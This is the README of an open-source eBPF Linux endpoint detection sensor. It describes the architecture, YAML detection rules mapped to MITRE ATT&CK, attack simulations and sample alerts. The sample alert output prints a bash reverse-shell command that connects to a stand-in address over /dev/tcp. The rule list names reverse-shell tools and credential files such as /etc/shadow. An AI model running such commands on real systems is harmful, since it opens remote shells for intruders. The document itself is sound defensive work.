# eBPF-Powered Linux Runtime Threat Detection & EDR Agent

[![CI Pipeline](https://github.com/ravishkarathnayaka/ebpf-linux-edr-sensor/actions/workflows/ci.yml/badge.svg)](https://github.com/ravishkarathnayaka/ebpf-linux-edr-sensor/actions/workflows/ci.yml)
[![Security Scan](https://github.com/ravishkarathnayaka/ebpf-linux-edr-sensor/actions/workflows/security-scan.yml/badge.svg)](https://github.com/ravishkarathnayaka/ebpf-linux-edr-sensor/actions/workflows/security-scan.yml)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Python: 3.10+](https://img.shields.io/badge/Python-3.10%2B-brightgreen.svg)](https://www.python.org/)
[![eBPF Kernel](https://img.shields.io/badge/eBPF-Tracepoints%20%26%20RingBuffers-purple.svg)](https://ebpf.io/)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK%20v14-red.svg)](https://attack.mitre.org/)

An open-source, production-grade Linux Endpoint Detection and Response (**EDR**) sensor powered by **Extended Berkeley Packet Filter (eBPF)**. The agent attaches lightweight, in-kernel probes to raw Linux system call tracepoints, aggregates high-fidelity security telemetry with minimal CPU overhead, normalizes binary kernel events, and evaluates runtime activity in real-time against customizable YAML detection rules enriched with **MITRE ATT&CK®** tactics and techniques.

---

## Architecture Overview

```mermaid
flowchart TD
    subgraph Kernel Space [Linux Kernel Space]
        direction TB
        TP1["tracepoint/syscalls/sys_enter_execve<br/><b>Process Executions & Args</b>"]
        TP2["tracepoint/syscalls/sys_enter_connect<br/><b>Outbound TCP Sockets</b>"]
        TP3["tracepoint/syscalls/sys_enter_ptrace<br/><b>Process Injection & Tampering</b>"]
        TP4["tracepoint/syscalls/sys_enter_openat<br/><b>Sensitive File Access</b>"]
        
        RING["BPF Perf Event Ring Buffer<br/><code>BPF_PERF_OUTPUT(events)</code>"]

        TP1 -->|bpf_perf_event_output| RING
        TP2 -->|bpf_perf_event_output| RING
        TP3 -->|bpf_perf_event_output| RING
        TP4 -->|bpf_perf_event_output| RING
    end

    subgraph User Space [EDR User-Space Daemon (agent/)]
        direction TB
        LOADER["<b>BPF Loader & Poller</b><br/><code>agent.core.bpf_loader</code><br/>Multi-threaded Ring Buffer Worker"]
        NORMALIZER["<b>Event Normalizer</b><br/><code>agent.core.event_normalizer</code><br/>Binary C-Struct Decoding & IP/Port Format"]
        ENGINE["<b>Rule Engine</b><br/><code>agent.detection.rule_engine</code><br/>Tree-Structured YAML Evaluator"]
        RULES[("<b>Detection Rules</b><br/><code>rules/*.yml</code><br/>Reverse Shell, Ptrace, PrivEsc")]
        MITRE["<b>MITRE ATT&CK Enricher</b><br/><code>agent.detection.mitre_enricher</code><br/>Tactics, Techniques & URLs"]
        OUTPUT["<b>Output Handler</b><br/><code>agent.alerts.output_handler</code><br/>Console, Syslog, JSONL File"]

        RING -.->|Zero-Copy Poll| LOADER
        LOADER -->|Raw Bytes Queue| NORMALIZER
        NORMALIZER -->|Normalized Telemetry| ENGINE
        RULES -.->|Load Conditions| ENGINE
        ENGINE -->|Matched Alert| MITRE
        MITRE -->|Enriched Alert| OUTPUT
    end

    subgraph Alert Sinks [Alert Dispatch Sinks]
        SINK1["Console (Pretty Terminal / JSON)"]
        SINK2["Alert Log (<code>/var/log/edr_alerts.json</code>)"]
        SINK3["Linux Syslog (<code>/dev/log</code>)"]

        OUTPUT --> SINK1
        OUTPUT --> SINK2
        OUTPUT --> SINK3
    end
```

---

## eBPF vs. Traditional Detection Mechanisms

| Architectural Dimension | **eBPF-Powered Sensor (This Project)** | **Auditd / Linux Audit Subsystem** | **`LD_PRELOAD` Hooking** | **Loadable Kernel Modules (LKM)** |
| :--- | :--- | :--- | :--- | :--- |
| **Execution Layer** | Kernel JIT-compiled bytecode | Kernel audit subsystem (`kauditd`) | User-space shared library injection | Kernel space (Native C execution) |
| **System Stability & Safety** | **Guaranteed safe** by kernel eBPF verifier (no panics/hangs) | Safe, but socket buffers can drop events under load | Fragile; user-space crashes break host apps | **High risk**; kernel bugs cause immediate Kernel Panic (BSOD) |
| **CPU / Memory Overhead** | **Ultra-Low (<1-2% CPU)** via in-kernel filtering & ring buffers | High overhead; context-switch and netlink socket penalties | Low overhead | Low overhead |
| **Bypass Resistance** | **High**; intercepts raw tracepoints directly in kernel | Medium; adversaries can unregister rules (`auditctl -D`) | **Trivial bypass**; static binaries or `dlopen` bypass hooks | High; root can unload module (`rmmod`) |
| **Context Extraction** | Deep lineage: PPID, real parent, args, network sockets | Text strings; limited correlation across subsystems | Limited to intercepted libc function arguments | Full arbitrary kernel access |
| **Container & Namespace Awareness** | **Full visibility** across all host and container PID/Net namespaces | Global host view; limited container-specific tagging | Must be injected into every container rootfs | Global host view |

---

## Technical Features

1. **Kernel-Level Syscall Tracepoints**:
   - `sys_enter_execve`: Intercepts every executable invocation, extracts parent process ID (`ppid`) via task structure traversal, user/group IDs, and command-line arguments.
   - `sys_enter_connect`: Intercepts socket connection attempts, converts `sockaddr_in` and `sockaddr_in6` into readable IP addresses and destination ports in host byte order.
   - `sys_enter_ptrace`: Detects memory injection, debugging, and code tampering requests (`PTRACE_ATTACH`, `PTRACE_POKETEXT`, `PTRACE_POKEDATA`, `PTRACE_SEIZE`).
   - `sys_enter_openat`: Detects direct file access, reads, and modifications on credential stores (`/etc/shadow`, `/root/.ssh/id_rsa`, `/etc/sudoers`).

2. **User-Space Event Processing Daemon**:
   - Python 3.10+ async daemon with decoupled multi-threading:
     - **Thread 1**: High-throughput BPF perf ring buffer polling with BCC.
     - **Thread 2**: Asynchronous worker pipeline that normalizes binary C-structures via `ctypes` and evaluates rule conditions.
   - **Modular YAML Rule Engine**: Supports boolean trees (`and`, `or`, `not`), regular expressions (`regex_match`), membership (`in`, `not_in`), numeric comparisons (`gt`, `lt`), and substring filters (`contains`, `startswith`).
   - **MITRE ATT&CK Matrix v14 Enrichment**: Automatically enriches alerts with Tactic IDs, Technique IDs, human-readable descriptions, and MITRE reference links.
   - **Multi-Sink Alerting**: Colorized console cards, RFC-compliant Syslog, and streaming JSON-Lines log files with built-in deduplication.

---

## Directory Structure

```text
├── .github/
│   └── workflows/
│       ├── ci.yml                 # Code linting (black, flake8, yamllint), and pytest test suite
│       └── security-scan.yml      # Trivy container/repo scan and Gitleaks secret detection
├── bpf/
│   ├── include/
│   │   └── common.h               # Shared C data structures (edr_event_t) between kernel & user-space
│   ├── execve_monitor.bpf.c       # Syscall tracepoint probe for process execution & arguments
│   ├── network_monitor.bpf.c      # Syscall tracepoint probe for outbound TCP socket connections
│   ├── ptrace_monitor.bpf.c       # Syscall tracepoint probe for process memory injection (PTRACE)
│   └── openat_monitor.bpf.c       # Syscall tracepoint probe for sensitive credential file access
├── agent/
│   ├── __init__.py
│   ├── requirements.txt           # Python agent dependencies
│   ├── core/
│   │   ├── __init__.py
│   │   ├── bpf_loader.py          # BCC probe compiler, attacher, and ring buffer poller
│   │   └── event_normalizer.py    # Binary C-struct decoder into normalized telemetry JSON
│   ├── detection/
│   │   ├── __init__.py
│   │   ├── rule_engine.py         # Evaluates normalized events against YAML detection logic
│   │   └── mitre_enricher.py      # Enriches alerts with MITRE ATT&CK tactics & techniques
│   ├── alerts/
│   │   ├── __init__.py
│   │   └── output_handler.py      # Multi-sink dispatcher: console, JSONL file, and Syslog
│   └── main.py                    # Main agent daemon entry point with signal handling
├── rules/
│   ├── reverse_shell.yml          # Rule: Interactive reverse shells (/dev/tcp, python, nc -e)
│   ├── process_injection.yml      # Rule: PTRACE_ATTACH / PTRACE_POKETEXT injection attempts
│   ├── privilege_escalation.yml   # Rule: UID 0 root shell execution under non-init parent
│   └── sensitive_file_access.yml  # Rule: Unauthorized access to /etc/shadow or SSH keys
├── simulations/
│   ├── trigger_reverse_shell.sh   # Harmless simulation script emulating reverse shell patterns
│   ├── trigger_ptrace.c           # Small C test binary calling PTRACE_ATTACH on a child process
│   └── run_simulations.sh         # Master verification script running benign vs. attack tests
├── tests/
│   ├── __init__.py
│   ├── test_rule_engine.py        # Unit tests verifying YAML rule matching & operators
│   ├── test_event_normalizer.py   # Unit tests verifying binary C-struct decoding into Python dicts
│   └── test_mitre_enricher.py     # Unit tests verifying MITRE ATT&CK taxonomy assignment
├── docker/
│   ├── Dockerfile                 # Privileged container with kernel headers, clang, BCC, and Python
│   └── docker-compose.yml         # Container runner with CAP_BPF, CAP_SYS_ADMIN, and host mounts
├── LICENSE                        # MIT License
├── requirements.txt               # Root project dependencies
└── README.md                      # Architecture overview and documentation
```

---

## Detection Rules & MITRE ATT&CK Mapping

| Rule ID | Detection Title | Event Type | Severity | MITRE Tactic | MITRE Technique | Technique ID |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **`RULE-EDR-001`** | Interactive Reverse Shell Execution | `EXECVE`, `CONNECT` | **CRITICAL** | Execution (`TA0002`) | Unix Shell | **T1059.004** |
| **`RULE-EDR-002`** | Process Memory Injection & PTRACE Abuse | `PTRACE` | **CRITICAL** | Defense Evasion (`TA0005`) | Ptrace System Calls | **T1055.008** |
| **`RULE-EDR-003`** | Unexpected Root Privilege Escalation | `EXECVE` | **HIGH** | Privilege Escalation (`TA0004`) | Exploitation for PrivEsc | **T1068** |
| **`RULE-EDR-004`** | Sensitive Credential & System File Access | `OPENAT`, `EXECVE` | **HIGH** | Credential Access (`TA0006`) | /etc/passwd & /etc/shadow | **T1003.008** |

---

## Quickstart Guide

### Option 1: Run with Docker Compose (Recommended)

The Docker setup mounts `/sys/kernel/debug`, `/sys/fs/bpf`, and `/lib/modules` from the host kernel, allowing instant execution on Linux hosts or WSL2 without installing BCC locally.

```bash
# 1. Navigate to docker directory
cd docker

# 2. Build and launch the privileged EDR sensor
docker compose up --build
```

In a separate terminal on the host, run the attack verification harness:
```bash
# Execute benign baseline and threat simulations
./simulations/run_simulations.sh
```

---

### Option 2: Run Directly on Linux Host

#### Prerequisites (Ubuntu / Debian):
```bash
sudo apt-get update && sudo apt-get install -y \
    bpfcc-tools \
    libbpfcc \
    libbpfcc-dev \
    python3-bpfcc \
    linux-headers-$(uname -r) \
    clang \
    llvm \
    python3-pip
```

#### Install Agent Dependencies:
```bash
pip install -r requirements.txt
```

#### Run the EDR Daemon (Requires Root / `sudo` for BPF capabilities):
```bash
sudo python3 -m agent.main --rules-dir ./rules --bpf-dir ./bpf --alert-file /var/log/edr_alerts.json
```

---

### Option 3: Synthetic Dry-Run & Unit Testing

You can verify rule evaluation, normalization, and MITRE enrichment on any operating system (including Windows and macOS) without root privileges or kernel headers:

```bash
# Run the synthetic dry-run verification suite
python -m agent.main --dry-run

# Run automated unit tests with pytest
pytest -v tests/
```

---

## Attack Simulations

The `simulations/` directory provides non-destructive test scripts to safely trigger and validate each detection rule:

```bash
# Run the automated master simulation harness
./simulations/run_simulations.sh
```

### Simulation Output Example:

```text
========================================================================
    eBPF Linux EDR Sensor - Master Attack Simulation Harness            
========================================================================
[*] Alert Log File: /var/log/edr_alerts.json

[STEP 1] Compiling attack simulation binaries...
[+] Successfully compiled trigger_ptrace binary.

[STEP 2] Running benign control operations (Should NOT trigger alerts)...
[+] Benign baseline operations completed.

[STEP 3] Executing simulated threat vectors...
[Test 3.1] Triggering Interactive Reverse Shell Vector...
[Test 3.2] Triggering Process Memory Injection (PTRACE) Vector...
[Test 3.3] Triggering Sensitive File Access (/etc/shadow read attempt)...

========================================================================
                   EDR DETECTION VERIFICATION SCORECARD                 
========================================================================
  RULE ID         | DETECTION TITLE                        | MITRE ID   | STATUS    
  --------------------------------------------------------------------------------
  RULE-EDR-001    | Interactive Reverse Shell Execution    | T1059.004  | PASS
  RULE-EDR-002    | Process Memory Injection & PTRACE Abuse| T1055.008  | PASS
  RULE-EDR-003    | Unexpected Root Privilege Escalation   | T1068      | PASS
  RULE-EDR-004    | Sensitive Credential File Access       | T1003.008  | PASS
  --------------------------------------------------------------------------------

[+] Simulation execution complete.
```

---

## Sample Alert Telemetry

### High-Severity Enriched Alert (JSON):
```json
{
  "alert_id": "a8f9c1b4-7e23-42e1-9876-123456789abc",
  "timestamp_utc": "2026-09-08T12:00:00.000000Z",
  "rule_id": "RULE-EDR-001",
  "rule_title": "Interactive Reverse Shell Execution",
  "severity": "CRITICAL",
  "description": "Detects interactive shell execution with socket redirects or reverse shell command patterns.",
  "mitre_attack": {
    "tactic_id": "TA0002",
    "tactic_name": "Execution",
    "technique_id": "T1059.004",
    "technique_name": "Command and Scripting Interpreter: Unix Shell",
    "technique_description": "Adversaries may abuse Unix shell commands and scripting interpreters (bash, sh, zsh) to execute arbitrary commands.",
    "reference_url": "https://attack.mitre.org/techniques/T1059/004/"
  },
  "event": {
    "timestamp_ns": 1700000000123456789,
    "timestamp_utc": "2026-09-08T12:00:00.000000Z",
    "event_type": "EXECVE",
    "pid": 1337,
    "tgid": 1337,
    "ppid": 1000,
    "uid": 1000,
    "gid": 1000,
    "comm": "bash",
    "filename": "/bin/bash",
    "args": "-i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "cmdline": "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "retval": 0
  }
}
```

### Console Card Alert:
```text
================================================================================
[!] EDR ALERT: Interactive Reverse Shell Execution [CRITICAL]
  Rule ID: RULE-EDR-001 | Alert ID: a8f9c1b4-7e23-42e1-9876-123456789abc
  MITRE ATT&CK: Execution (TA0002) -> Command and Scripting Interpreter: Unix Shell (T1059.004)
  Timestamp: 2026-09-08T12:00:00.000000Z
  Description: Detects interactive shell execution with socket redirects or reverse shell command patterns.
  Process: comm='bash' pid=1337 ppid=1000 uid=1000
  Cmdline: /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
================================================================================
```

---

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
